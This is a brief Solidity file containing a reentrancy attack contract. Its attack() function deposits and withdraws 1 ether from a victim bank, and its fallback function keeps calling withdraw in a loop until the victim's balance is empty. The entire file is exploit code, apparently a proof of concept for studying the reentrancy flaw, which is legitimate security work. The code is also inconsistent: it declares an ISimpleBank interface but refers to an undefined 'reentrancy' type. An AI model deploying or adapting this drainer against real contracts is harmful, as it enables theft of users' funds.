pragma solidity ^0.8.0;

 interface ISimpleBank{
      function deposit() external payable;
      

    function withdraw(uint _amount) external;
     
        
    }
contract reentrancyattack{
     function ContractBalance() public view returns(uint){
        return address(this).balance;
    }

    reentrancy victim;

    constructor(address _contractAddress) payable{
        victim = reentrancy(_contractAddress);

    }
    function attack() public payable{
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }
    //The fallback function will re-enter the withdraw function till there are not funds left
    fallback() external payable{
    
        while(address(victim).balance!=0){
            victim.withdraw(1 ether);
        }


    }
}